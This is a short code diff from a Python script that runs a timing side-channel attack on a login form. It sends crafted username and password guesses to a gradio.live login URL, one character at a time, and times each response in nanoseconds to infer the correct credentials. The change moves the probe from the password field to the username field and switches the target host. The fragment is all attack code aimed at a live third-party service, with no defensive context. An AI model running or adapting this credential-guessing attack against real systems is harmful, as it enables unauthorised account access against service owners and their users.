@@ -32,14 +32,14 @@ def main():
             print("pass {0}/{1} executed".format(i, repeats))
             for c in characters:
                 data = {
-                    'username': 'openai',
-                    'password': '{0}AAAAAAA'.format(c) #isCloseAi
+                    'username': '{0}AAAAAAA'.format(c), #openai
+                    'password': 'AAAAAAAA' #isCloseAi
                 }
 
                 print("requesting")
                 time_start = time.monotonic_ns()
                 try:
-                    r = session.post("https://44fd86288430d3b355.gradio.live/login", data)
+                    r = session.post("https://44b22a6eeee0f9d7d9.gradio.live/login", data)
                 except:
                     print("unreachable network")
                     pass
